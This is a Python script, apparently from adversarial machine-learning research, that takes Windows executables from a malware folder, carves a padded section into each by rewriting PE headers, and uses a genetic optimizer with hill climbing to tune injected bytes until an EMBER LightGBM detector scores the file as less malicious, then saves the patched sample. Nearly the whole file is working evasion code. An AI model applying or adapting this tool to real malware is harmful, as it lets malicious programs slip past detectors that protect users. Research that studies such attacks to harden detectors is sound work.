# Imports (optimizer, code caver, blackbox interface)
import random
import copy
import os
from tqdm import tqdm

import pefile
import struct
import sys

import ember
import lightgbm as lgb


# Code caver
def align(val, to):
    if val % to == 0: return val
    return val + (to - (val % to))

def allocate_code_cave(source, payload):
    try: 
        pe = pefile.PE(source)
    except FileNotFoundError:
        print(f"[!] File {source} not found.")
        return

    file_align = pe.OPTIONAL_HEADER.FileAlignment
    section_table_offset = (pe.DOS_HEADER.e_lfanew + 4 + 20 + pe.FILE_HEADER.SizeOfOptionalHeader)
    
    payload_len = len(payload)
    padded_payload_len = align(payload_len, file_align)
    padded_payload = payload + b'\x00' * (padded_payload_len - payload_len)

    # IMPROVE: Multiple sections targetting feature
    target_section = pe.sections[0]
    injection_offset = target_section.PointerToRawData + target_section.SizeOfRawData

    with open(source, "rb") as f:
        data = bytearray(f.read())

    first_header_offset = section_table_offset
    original_raw_size = struct.unpack_from('<I', data, first_header_offset + 16)[0]
    new_raw_size = original_raw_size + padded_payload_len
    struct.pack_into('<I', data, first_header_offset + 16, new_raw_size)

    for i in range(pe.FILE_HEADER.NumberOfSections):
        sec_offset = section_table_offset + (i * 40)
        raw_ptr = struct.unpack_from('<I', data, sec_offset + 20)[0]

        if raw_ptr >= injection_offset:
            struct.pack_into('<I', data, sec_offset + 20, raw_ptr + padded_payload_len)

    try:
        if hasattr(pe, 'DIRECTORY_ENTRY_DEBUG'):
            for debug in pe.DIRECTORY_ENTRY_DEBUG:
                if debug.struct.PointerToRawData > injection_offset:
                    debug_file_offset = debug.struct.get_file_offset()
                    current_ptr = debug.struct.PointerToRawData
                    struct.pack_into('<I', data, debug_file_offset + 20, current_ptr + padded_payload_len)
    except Exception as e:
        print(f"[!] Warning: Debug Directory patch skipped: {e}")

    try:
        data_dirs = None
        if hasattr(pe.OPTIONAL_HEADER, 'DataDirectory'):
            data_dirs = pe.OPTIONAL_HEADER.DataDirectory
        elif hasattr(pe.OPTIONAL_HEADER, 'DATA_DIRECTORY'):
            data_dirs = pe.OPTIONAL_HEADER.DATA_DIRECTORY

        if data_dirs and len(data_dirs) > 4:
            sec_dir_entry = data_dirs[4]
            if sec_dir_entry.VirtualAddress > injection_offset:
                sec_dir_file_offset = sec_dir_entry.struct.get_file_offset()
                struct.pack_into('<I', data, sec_dir_file_offset, sec_dir_entry.VirtualAddress + padded_payload_len)
    except Exception as e:
        print(f"[!] Warning: Security Directory patch skipped: {e}")

    final_data = data[:injection_offset] + padded_payload + data[injection_offset:]
    return final_data, injection_offset, padded_payload_len


# Blackbox interface
def query_model(model, payload):
    return ember.predict_sample(model, payload)

def query_full(model, sourceArmor, injectionOffset, caveSize, payload):
    patched = inject_payload(sourceArmor, injectionOffset, caveSize, payload)

    return ember.predict_sample(model, patched)


# Payload injector
def inject_payload(sourceArmor, injectionOffset, caveSize, payload):
    paddedPayload = payload + b'\x00' * (caveSize - len(payload))

    return sourceArmor[:injectionOffset] + paddedPayload + sourceArmor[injectionOffset+caveSize:]


# Memetic optimizer
def hill_climb(payload, query_fn, max_queries, byte_alphabet):
    data = bytearray(payload)
    best_score = query_fn(bytes(data))
    queries = 1

    idxs = list(range(len(data)))

    while queries < max_queries:
        improved = False
        random.shuffle(idxs)

        for i in idxs:
            orig = data[i]
            for b in byte_alphabet:
                if b == orig:
                    continue

                data[i] = b
                score = query_fn(bytes(data))
                queries += 1

                if score < best_score:
                    best_score = score
                    improved = True
                    break
                else:
                    data[i] = orig

                if queries >= max_queries:
                    break

            if improved or queries >= max_queries:
                break

        if not improved:
            break 

    return bytes(data), queries

def generate_payload(length, mode):
    if mode == "random":
        return os.urandom(length)

    if mode == "low_entropy":
        b = random.choice([0x00, 0x90, 0xFF])
        return bytes([b]) * length

    if mode == "mixed":
        base = bytearray(os.urandom(length))
        for i in range(0, length, 4):
            base[i] = 0x00
        return bytes(base)

    raise ValueError("Unknown mode")

class Individual:
    def __init__(self, length, mode):
        self.length = length
        self.mode = mode
        self.payload = None
        self.fitness = None

def clamp_len(x, min_len, max_len):
    return max(min_len, min(x, max_len))

def optimize_payload_memetic(
        initial_payload,
        query_fn,
        max_queries = 5000,
        pop_size = 20,
        generations = 30,
        elite_k = 4,
        byte_alphabet = b"\x00\x90\xFF\xCC\x20\x41"
):
    queries_left = max_queries
    population = []
    base_len = len(initial_payload)
    pbar = tqdm(total=max_queries, initial=0)

    for _ in range(pop_size):
        length = max(128, base_len + random.choice([-512, -256, 0, 256, 512]))
        mode = random.choice(["random", "low_entropy", "mixed"])
        population.append(Individual(length, mode))

    best_payload = initial_payload
    best_score = query_fn(initial_payload)
    queries_left -= 1
    pbar.update(1)

    for _ in range(generations):
        if queries_left <= 0:
            break

        for ind in population:
            if ind.fitness is not None:
                continue

            ind.payload = generate_payload(ind.length, ind.mode)
            ind.fitness = query_fn(ind.payload)
            queries_left -= 1
            pbar.update(1)

            if ind.fitness < best_score:
                best_score = ind.fitness
                best_payload = ind.payload

            if queries_left <= 0:
                break

        population.sort(key=lambda x: x.fitness)
        elites = population[:elite_k]

        new_pop = elites.copy()
        while len(new_pop) < pop_size and queries_left > 0:
            p1, p2 = random.sample(elites, 2)
            child = copy.deepcopy(p1)

            # crossover
            if random.random() < 0.5:
                child.length = p2.length
            if random.random() < 0.5:
                child.mode = p2.mode

            # mutation
            if random.random() < 0.3:
                child.length = max(128, child.length + random.choice([-256, 256]))
            if random.random() < 0.2:
                child.mode = random.choice(["random", "low_entropy", "mixed"])

            child.payload = generate_payload(child.length, child.mode)
            child.fitness = query_fn(child.payload)
            queries_left -= 1
            pbar.update(1)

            # Local search mechanism
            if queries_left > 0:
                local_budget = min(200, queries_left)
                refined, used = hill_climb(
                    child.payload,
                    query_fn,
                    local_budget,
                    byte_alphabet
                )
                queries_left -= used
                child.payload = refined
                child.fitness = query_fn(refined)
                queries_left -= 1
                pbar.update(1)

            if child.fitness < best_score:
                best_score = child.fitness
                best_payload = child.payload

            new_pop.append(child)

        population = new_pop

    pbar.close()
    return best_payload
    
    
# Main runner
sha256 = sys.argv[1]
source = f"malwares/{sha256}.exe"
malconvEmber = lgb.Booster(model_file="weight-ember.txt")
confidence = query_model(malconvEmber, open(source, "rb").read())
print(f"Initial confidence rate: {confidence}")


initialPayload = b"\x00"*3000
sourceArmor, injectionOffset, caveSize = allocate_code_cave(source, initialPayload)

def query_simple(payload):
    confidence = query_full(malconvEmber, sourceArmor, injectionOffset, caveSize, payload)
    print(f"query: {confidence}")
    return confidence


finalPayload = optimize_payload_memetic(initialPayload, query_simple, 100)
print(f"Final length: {len(finalPayload)}")
patched = inject_payload(sourceArmor, injectionOffset, caveSize, finalPayload)
confidence = query_model(malconvEmber, patched)
print(f"Final confidence rate: {confidence}")

with open(f"patched/{sha256}.exe", "wb") as f:
    f.write(patched)
print(f"Patch process done.")